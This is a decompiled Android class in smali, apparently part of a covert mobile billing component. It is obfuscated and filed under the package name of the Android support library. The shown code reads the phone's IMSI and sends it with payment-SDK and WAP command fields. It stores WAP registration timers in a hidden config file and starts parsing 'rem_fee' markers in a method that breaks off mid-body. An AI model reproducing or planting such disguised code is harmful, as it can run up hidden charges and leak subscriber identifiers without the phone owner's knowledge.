.class public Landroid/support/v4/app/a;
.super Ljava/lang/Object;


# static fields
.field private static final a:Ljava/lang/String;

.field private static b:J

.field private static c:Landroid/support/v4/app/a;

.field private static d:Z

.field private static e:Z

.field private static f:J

.field private static g:J

.field private static h:J

.field private static i:J

.field private static j:I

.field private static k:I

.field private static n:I


# instance fields
.field private l:I

.field private m:I

.field private o:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    const-class v0, Landroid/support/v4/app/a;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    const-wide/32 v0, 0xa4cb80

    sput-wide v0, Landroid/support/v4/app/a;->b:J

    sput-boolean v2, Landroid/support/v4/app/a;->d:Z

    sput-boolean v2, Landroid/support/v4/app/a;->e:Z

    sput v2, Landroid/support/v4/app/a;->j:I

    sput v2, Landroid/support/v4/app/a;->k:I

    sput v2, Landroid/support/v4/app/a;->n:I

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput v0, p0, Landroid/support/v4/app/a;->l:I

    iput v0, p0, Landroid/support/v4/app/a;->m:I

    new-instance v0, Landroid/support/v4/app/b;

    invoke-direct {v0, p0}, Landroid/support/v4/app/b;-><init>(Landroid/support/v4/app/a;)V

    iput-object v0, p0, Landroid/support/v4/app/a;->o:Landroid/os/Handler;

    return-void
.end method

.method static synthetic a(Landroid/support/v4/app/a;)I
    .locals 1

    iget v0, p0, Landroid/support/v4/app/a;->l:I

    return v0
.end method

.method public static a()Landroid/support/v4/app/a;
    .locals 3

    sget-object v0, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "getInstance instance="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Landroid/support/v4/app/a;->c:Landroid/support/v4/app/a;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Landroid/support/v4/app/a;->c:Landroid/support/v4/app/a;

    if-nez v0, :cond_0

    const/4 v0, 0x1

    sput-boolean v0, Landroid/support/v4/app/a;->d:Z

    const/4 v0, 0x0

    sput-boolean v0, Landroid/support/v4/app/a;->e:Z

    new-instance v0, Landroid/support/v4/app/a;

    invoke-direct {v0}, Landroid/support/v4/app/a;-><init>()V

    sput-object v0, Landroid/support/v4/app/a;->c:Landroid/support/v4/app/a;

    :cond_0
    sget-object v0, Landroid/support/v4/app/a;->c:Landroid/support/v4/app/a;

    return-object v0
.end method

.method static synthetic a(I)V
    .locals 0

    sput p0, Landroid/support/v4/app/a;->n:I

    return-void
.end method

.method private a(Landroid/content/Context;IILjava/lang/String;)Z
    .locals 7

    const/4 v6, 0x1

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iput p2, p0, Landroid/support/v4/app/a;->l:I

    iput p3, p0, Landroid/support/v4/app/a;->m:I

    sget-object v0, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "startWapCfg cmd="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Landroid/support/v4/app/f;->b(Landroid/content/Context;)Landroid/support/v4/app/f;

    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    const-string v0, "cmdType"

    const/16 v3, 0xcd

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v3, "mtid"

    new-instance v4, Ljava/lang/StringBuilder;

    sget-object v0, Landroid/support/v4/app/f;->c:Ljava/util/HashMap;

    const-string v5, "imsi"

    invoke-virtual {v0, v5}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Landroid/support/v4/app/Support;->e()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {}, Landroid/support/v4/app/Support;->f()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, "000000000010100"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v3, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "vendortype"

    invoke-static {}, Landroid/support/v4/app/Support;->d()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "platform"

    const-string v3, "ANDROID"

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "core_sw_ver"

    const-string v3, "v1019"

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "pay_sdk_ver"

    const-string v3, "000001"

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "msdv"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "mscv"

    sget v3, Landroid/support/v4/app/a;->j:I

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "wsdv"

    invoke-static {v6}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "wscv"

    sget v3, Landroid/support/v4/app/a;->k:I

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "wcmd"

    invoke-static {p2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "chnid"

    invoke-static {p3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v0, Landroid/support/v4/app/j;

    invoke-direct {v0, v1}, Landroid/support/v4/app/j;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, Landroid/support/v4/app/a;->o:Landroid/os/Handler;

    invoke-virtual {v0, v1, v2}, Landroid/support/v4/app/j;->a(Landroid/os/Handler;Ljava/util/Map;)V

    return v6
.end method

.method static synthetic a(Landroid/support/v4/app/a;Landroid/content/Context;IILjava/lang/String;)Z
    .locals 1

    invoke-direct {p0, p1, p2, p3, p4}, Landroid/support/v4/app/a;->a(Landroid/content/Context;IILjava/lang/String;)Z

    move-result v0

    return v0
.end method

.method static synthetic b(Landroid/support/v4/app/a;)I
    .locals 1

    iget v0, p0, Landroid/support/v4/app/a;->m:I

    return v0
.end method

.method static synthetic b()Ljava/lang/String;
    .locals 1

    sget-object v0, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic c()I
    .locals 1

    sget v0, Landroid/support/v4/app/a;->n:I

    return v0
.end method

.method private d(Landroid/content/Context;)Z
    .locals 3

    const/16 v0, 0x21

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-direct {p0, p1, v0, v1, v2}, Landroid/support/v4/app/a;->a(Landroid/content/Context;IILjava/lang/String;)Z

    move-result v0

    return v0
.end method

.method private e(Landroid/content/Context;)Z
    .locals 3

    const/16 v0, 0x100

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-direct {p0, p1, v0, v1, v2}, Landroid/support/v4/app/a;->a(Landroid/content/Context;IILjava/lang/String;)Z

    move-result v0

    return v0
.end method

.method private declared-synchronized f(Landroid/content/Context;)Z
    .locals 7

    const/4 v0, 0x0

    monitor-enter p0

    const/4 v2, 0x0

    :try_start_0
    sget-object v1, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    const-string v3, "saveFilterData"

    invoke-static {v1, v3}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :try_start_1
    const-string v4, "file_ver"

    const-string v5, "1.0.0"

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v4, "wap_reg_remain"

    sget-wide v5, Landroid/support/v4/app/a;->f:J

    invoke-virtual {v3, v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v4, "wap_reg_deadline"

    sget-wide v5, Landroid/support/v4/app/a;->h:J

    invoke-virtual {v3, v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v4, "wap_cfg_remain"

    sget-wide v5, Landroid/support/v4/app/a;->g:J

    invoke-virtual {v3, v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v4, "wap_cfg_deadline"

    sget-wide v5, Landroid/support/v4/app/a;->i:J

    invoke-virtual {v3, v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v4, "mscv"

    sget v5, Landroid/support/v4/app/a;->j:I

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v4, "wscv"

    sget v5, Landroid/support/v4/app/a;->k:I

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v4, "cfg.data"

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v2

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v4, "UTF-8"

    invoke-static {v1, v4}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/io/FileOutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    sget-object v1, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    sget-wide v3, Landroid/support/v4/app/a;->h:J

    invoke-static {v1, v3, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;J)V

    sget-object v1, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    sget-wide v3, Landroid/support/v4/app/a;->i:J

    invoke-static {v1, v3, v4}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    if-eqz v2, :cond_0

    :try_start_2
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :cond_0
    :goto_0
    const/4 v0, 0x1

    :cond_1
    :goto_1
    monitor-exit p0

    return v0

    :catch_0
    move-exception v0

    :try_start_3
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    monitor-exit p0

    throw v0

    :catch_1
    move-exception v1

    :try_start_4
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    if-eqz v2, :cond_1

    :try_start_5
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_2
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    goto :goto_1

    :catch_2
    move-exception v1

    :try_start_6
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_1

    :catchall_1
    move-exception v0

    if-eqz v2, :cond_2

    :try_start_7
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V
    :try_end_7
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_3
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    :cond_2
    :goto_2
    :try_start_8
    throw v0

    :catch_3
    move-exception v1

    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto :goto_2
.end method

.method private declared-synchronized g(Landroid/content/Context;)Z
    .locals 14

    monitor-enter p0

    const/4 v0, 0x0

    const/4 v1, 0x0

    const/4 v4, 0x0

    const/4 v3, 0x0

    :try_start_0
    sget-object v2, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "loadFilterData mNeedRestore="

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-boolean v6, Landroid/support/v4/app/a;->d:Z

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    sget-boolean v2, Landroid/support/v4/app/a;->d:Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    if-nez v2, :cond_0

    const/4 v0, 0x1

    :goto_0
    monitor-exit p0

    return v0

    :cond_0
    :try_start_1
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    const/4 v2, 0x0

    sput-boolean v2, Landroid/support/v4/app/a;->d:Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    :try_start_2
    const-string v2, "cfg.data"

    invoke-virtual {v5, v2}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_5
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    move-result-object v2

    :try_start_3
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_6
    .catchall {:try_start_3 .. :try_end_3} :catchall_3

    const/16 v1, 0x800

    :try_start_4
    new-array v1, v1, [B

    :goto_1
    invoke-virtual {v2, v1}, Ljava/io/FileInputStream;->read([B)I

    move-result v8

    const/4 v9, -0x1

    if-ne v8, v9, :cond_5

    new-instance v1, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v8

    invoke-direct {v1, v8}, Ljava/lang/String;-><init>([B)V

    const-string v8, "UTF-8"

    invoke-static {v1, v8}, Ljava/net/URLDecoder;->decode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-virtual {v2}, Ljava/io/FileInputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_4

    const/4 v0, 0x0

    const/4 v1, 0x0

    :try_start_5
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, v8}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    sget-object v9, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    invoke-static {v9, v8}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v8, "file_ver"

    invoke-virtual {v2, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v9, "1.0.0"

    invoke-virtual {v9, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_8

    const/4 v4, 0x1

    const/4 v3, 0x1

    const-wide/16 v8, 0x0

    sput-wide v8, Landroid/support/v4/app/a;->f:J

    sget-wide v8, Landroid/support/v4/app/a;->b:J

    sput-wide v8, Landroid/support/v4/app/a;->g:J

    const/4 v2, 0x0

    sput v2, Landroid/support/v4/app/a;->j:I

    const/4 v2, 0x0

    sput v2, Landroid/support/v4/app/a;->k:I

    :cond_1
    :goto_2
    sget-object v2, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "wapRegRemain="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-wide v9, Landroid/support/v4/app/a;->f:J

    invoke-virtual {v8, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " wapRegDeadline="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    sget-wide v9, Landroid/support/v4/app/a;->h:J

    invoke-virtual {v8, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " wapCfgRemain="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    sget-wide v9, Landroid/support/v4/app/a;->g:J

    invoke-virtual {v8, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " wapCfgDeadline="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    sget-wide v9, Landroid/support/v4/app/a;->i:J

    invoke-virtual {v8, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v8}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    if-eqz v0, :cond_2

    :try_start_6
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->close()V

    :cond_2
    if-eqz v1, :cond_3

    invoke-virtual {v1}, Ljava/io/FileInputStream;->close()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    :cond_3
    :goto_3
    if-eqz v4, :cond_d

    if-eqz v3, :cond_4

    const-wide/16 v0, 0x0

    add-long/2addr v0, v6

    :try_start_7
    sput-wide v0, Landroid/support/v4/app/a;->h:J

    sget-wide v0, Landroid/support/v4/app/a;->b:J

    add-long/2addr v0, v6

    sput-wide v0, Landroid/support/v4/app/a;->i:J

    :cond_4
    invoke-direct {p0, v5}, Landroid/support/v4/app/a;->f(Landroid/content/Context;)Z
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    const/4 v0, 0x1

    goto/16 :goto_0

    :cond_5
    const/4 v9, 0x0

    :try_start_8
    invoke-virtual {v0, v1, v9, v8}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_0
    .catchall {:try_start_8 .. :try_end_8} :catchall_4

    goto/16 :goto_1

    :catch_0
    move-exception v1

    move-object v1, v2

    :goto_4
    const/4 v4, 0x1

    const/4 v3, 0x1

    const-wide/16 v8, 0x0

    :try_start_9
    sput-wide v8, Landroid/support/v4/app/a;->f:J

    sget-wide v8, Landroid/support/v4/app/a;->b:J

    sput-wide v8, Landroid/support/v4/app/a;->g:J

    const/4 v2, 0x0

    sput v2, Landroid/support/v4/app/a;->j:I

    const/4 v2, 0x0

    sput v2, Landroid/support/v4/app/a;->k:I
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_5

    if-eqz v0, :cond_6

    :try_start_a
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->close()V

    :cond_6
    if-eqz v1, :cond_7

    invoke-virtual {v1}, Ljava/io/FileInputStream;->close()V
    :try_end_a
    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_3
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    :cond_7
    :goto_5
    const-wide/16 v0, 0x0

    add-long/2addr v0, v6

    :try_start_b
    sput-wide v0, Landroid/support/v4/app/a;->h:J

    sget-wide v0, Landroid/support/v4/app/a;->b:J

    add-long/2addr v0, v6

    sput-wide v0, Landroid/support/v4/app/a;->i:J

    invoke-direct {p0, v5}, Landroid/support/v4/app/a;->f(Landroid/content/Context;)Z
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_1

    const/4 v0, 0x1

    goto/16 :goto_0

    :cond_8
    :try_start_c
    const-string v8, "wap_reg_remain"

    invoke-virtual {v2, v8}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v8

    sput-wide v8, Landroid/support/v4/app/a;->f:J

    const-string v8, "wap_reg_deadline"

    invoke-virtual {v2, v8}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v8

    sput-wide v8, Landroid/support/v4/app/a;->h:J

    const-string v8, "wap_cfg_remain"

    invoke-virtual {v2, v8}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v8

    sput-wide v8, Landroid/support/v4/app/a;->g:J

    const-string v8, "wap_cfg_deadline"

    invoke-virtual {v2, v8}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v8

    sput-wide v8, Landroid/support/v4/app/a;->i:J

    const-string v8, "mscv"

    invoke-virtual {v2, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v8

    sput v8, Landroid/support/v4/app/a;->j:I

    const-string v8, "wscv"

    invoke-virtual {v2, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v2

    sput v2, Landroid/support/v4/app/a;->k:I

    sget-wide v8, Landroid/support/v4/app/a;->g:J

    const-wide/16 v10, 0x0

    cmp-long v2, v8, v10

    if-lez v2, :cond_1

    sget-wide v8, Landroid/support/v4/app/a;->i:J

    const-wide/16 v10, 0x0

    cmp-long v2, v8, v10

    if-lez v2, :cond_1

    sget-wide v8, Landroid/support/v4/app/a;->g:J

    add-long/2addr v8, v6

    sget-wide v10, Landroid/support/v4/app/a;->i:J

    cmp-long v2, v8, v10

    if-lez v2, :cond_1

    const/4 v4, 0x1

    sget-wide v8, Landroid/support/v4/app/a;->i:J

    cmp-long v2, v8, v6

    if-lez v2, :cond_9

    sget-wide v8, Landroid/support/v4/app/a;->i:J

    sub-long/2addr v8, v6

    sput-wide v8, Landroid/support/v4/app/a;->g:J

    goto/16 :goto_2

    :catch_1
    move-exception v2

    goto/16 :goto_4

    :cond_9
    const-wide/16 v8, 0x0

    sput-wide v8, Landroid/support/v4/app/a;->g:J
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_1
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    goto/16 :goto_2

    :catchall_0
    move-exception v2

    move-object v12, v2

    move v2, v4

    move-object v4, v1

    move v1, v3

    move-object v3, v0

    move-object v0, v12

    :goto_6
    if-eqz v3, :cond_a

    :try_start_d
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V

    :cond_a
    if-eqz v4, :cond_b

    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V
    :try_end_d
    .catch Ljava/io/IOException; {:try_start_d .. :try_end_d} :catch_4
    .catchall {:try_start_d .. :try_end_d} :catchall_1

    :cond_b
    :goto_7
    if-eqz v2, :cond_e

    if-eqz v1, :cond_c

    const-wide/16 v0, 0x0

    add-long/2addr v0, v6

    :try_start_e
    sput-wide v0, Landroid/support/v4/app/a;->h:J

    sget-wide v0, Landroid/support/v4/app/a;->b:J

    add-long/2addr v0, v6

    sput-wide v0, Landroid/support/v4/app/a;->i:J

    :cond_c
    invoke-direct {p0, v5}, Landroid/support/v4/app/a;->f(Landroid/content/Context;)Z

    const/4 v0, 0x1

    goto/16 :goto_0

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_1

    goto/16 :goto_3

    :catchall_1
    move-exception v0

    monitor-exit p0

    throw v0

    :cond_d
    const/4 v0, 0x1

    goto/16 :goto_0

    :catch_3
    move-exception v0

    :try_start_f
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_5

    :catch_4
    move-exception v3

    invoke-virtual {v3}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_7

    :cond_e
    throw v0
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_1

    :catchall_2
    move-exception v2

    move-object v12, v2

    move v2, v4

    move-object v4, v0

    move-object v0, v12

    move-object v13, v1

    move v1, v3

    move-object v3, v13

    goto :goto_6

    :catchall_3
    move-exception v0

    move v12, v3

    move-object v3, v1

    move v1, v12

    move v13, v4

    move-object v4, v2

    move v2, v13

    goto :goto_6

    :catchall_4
    move-exception v1

    move-object v12, v1

    move v1, v3

    move-object v3, v0

    move-object v0, v12

    move v13, v4

    move-object v4, v2

    move v2, v13

    goto :goto_6

    :catchall_5
    move-exception v2

    move-object v12, v2

    move v2, v4

    move-object v4, v1

    move v1, v3

    move-object v3, v0

    move-object v0, v12

    goto :goto_6

    :catch_5
    move-exception v2

    move-object v12, v1

    move-object v1, v0

    move-object v0, v12

    goto/16 :goto_4

    :catch_6
    move-exception v0

    move-object v0, v1

    move-object v1, v2

    goto/16 :goto_4
.end method


# virtual methods
.method public a([B)V
    .locals 8

    :try_start_0
    const-string v0, "rem_fee_begin\r\n"

    const-string v1, "UTF-8"

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    const-string v0, "rem_fee_end\r\n"

    const-string v1, "UTF-8"

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v6

    array-length v1, p1

    array-length v3, v2

    const/4 v4, 0x0

    array-length v5, p1

    move-object v0, p1

